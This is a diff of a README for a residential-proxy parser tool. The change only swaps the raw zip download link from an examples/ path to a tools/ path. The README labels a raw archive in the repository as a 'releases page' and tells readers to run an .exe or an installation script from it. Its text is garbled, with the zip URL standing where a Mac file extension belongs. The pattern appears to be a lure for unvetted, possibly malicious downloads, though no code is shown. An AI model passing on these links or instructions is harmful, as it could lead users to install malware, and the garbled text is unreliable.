@@ -1,6 +1,6 @@
 # 🌐 clash-residential-proxy-parser - Simplify Your Proxy Management
 
-[![Download](https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/examples/proxy_clash_residential_parser_gubbertush.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/examples/proxy_clash_residential_parser_gubbertush.zip)
+[![Download](https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/tools/proxy_parser_residential_clash_2.8.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/tools/proxy_parser_residential_clash_2.8.zip)
 
 ## 📖 Overview
 
@@ -14,10 +14,10 @@ Follow these simple steps to download and run the clash-residential-proxy-parser
 
 1. **Visit the Releases Page**
    Click the link below to visit the releases page and download the software:
-   [Download the Latest Release](https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/examples/proxy_clash_residential_parser_gubbertush.zip)
+   [Download the Latest Release](https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/tools/proxy_parser_residential_clash_2.8.zip)
 
 2. **Choose the Right File**
-   On the releases page, look for the latest version. You will see various files available for download. Select the one suitable for your operating system. Most users will want to download a file that ends with `.exe` for Windows or `https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/examples/proxy_clash_residential_parser_gubbertush.zip` for Mac.
+   On the releases page, look for the latest version. You will see various files available for download. Select the one suitable for your operating system. Most users will want to download a file that ends with `.exe` for Windows or `https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/tools/proxy_parser_residential_clash_2.8.zip` for Mac.
 
 3. **Download the File**
    Click the file name to start the download. It may take a few moments depending on your internet speed. 
@@ -26,7 +26,7 @@ Follow these simple steps to download and run the clash-residential-proxy-parser
    Once the download is complete, find the file in your Downloads folder or the location you specified during the download.
 
 5. **Install the Application**
-   If you downloaded an `.exe` file, double-click it to run the installer. Follow the prompts to complete the installation process. If you downloaded a `https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/examples/proxy_clash_residential_parser_gubbertush.zip` file, extract it first, then run the included installation script.
+   If you downloaded an `.exe` file, double-click it to run the installer. Follow the prompts to complete the installation process. If you downloaded a `https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/tools/proxy_parser_residential_clash_2.8.zip` file, extract it first, then run the included installation script.
 
 6. **Launch the Application**
    After installation, open the application from your Start Menu or Applications folder. You are now ready to start using the clash-residential-proxy-parser.
@@ -82,4 +82,4 @@ The clash-residential-proxy-parser is open-source software. Feel free to use, mo
 You are now ready to make full use of the clash-residential-proxy-parser. With just a few simple steps, you can successfully manage residential proxies and enhance your network experience. 
 
 For additional downloads or the latest updates, refer back to our releases page:  
-[Download the Latest Release](https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/examples/proxy_clash_residential_parser_gubbertush.zip)
+[Download the Latest Release](https://raw.githubusercontent.com/GuyZangi/clash-residential-proxy-parser/main/tools/proxy_parser_residential_clash_2.8.zip)
